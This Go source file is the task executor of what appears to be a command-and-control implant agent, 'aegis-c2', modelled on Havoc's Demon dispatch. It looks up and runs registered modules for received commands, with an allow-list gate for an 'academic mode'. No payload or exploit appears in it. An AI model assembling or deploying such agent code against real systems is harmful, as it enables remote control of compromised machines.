package executor

import (
	"fmt"

	"github.com/aegis-c2/aegis/agent/modules"
	"github.com/aegis-c2/aegis/shared/protocol"
)

// Executor 负责任务的调度和执行。
// 借鉴 Havoc 的 Demon 命令分发模型：根据命令类型查找对应的模块处理器。
type Executor struct {
	academicMode bool
	allowedCmds  map[string]bool
}

// New 创建执行器。
func New(academicMode bool, allowedCmds []string) *Executor {
	allowed := make(map[string]bool)
	for _, cmd := range allowedCmds {
		allowed[cmd] = true
	}
	return &Executor{
		academicMode: academicMode,
		allowedCmds:  allowed,
	}
}

// Execute 执行任务并返回结果。
func (e *Executor) Execute(task *protocol.TaskPayload) *protocol.ResultPayload {
	// 安全检查
	if e.academicMode {
		if !e.allowedCmds[task.Command] {
			return &protocol.ResultPayload{
				TaskID: task.TaskID,
				Status: "failed",
				Stderr: []byte(fmt.Sprintf("command %q blocked in academic mode", task.Command)),
			}
		}
	}

	// 查找模块
	mod, ok := modules.Registry[task.Command]
	if !ok {
		return &protocol.ResultPayload{
			TaskID: task.TaskID,
			Status: "failed",
			Stderr: []byte(fmt.Sprintf("unknown command: %s", task.Command)),
		}
	}

	// 执行模块
	stdout, stderr, exitCode := mod(task.Args)

	status := "success"
	if exitCode != 0 {
		status = "failed"
	}

	return &protocol.ResultPayload{
		TaskID:   task.TaskID,
		Status:   status,
		Stdout:   []byte(stdout),
		Stderr:   []byte(stderr),
		ExitCode: exitCode,
	}
}
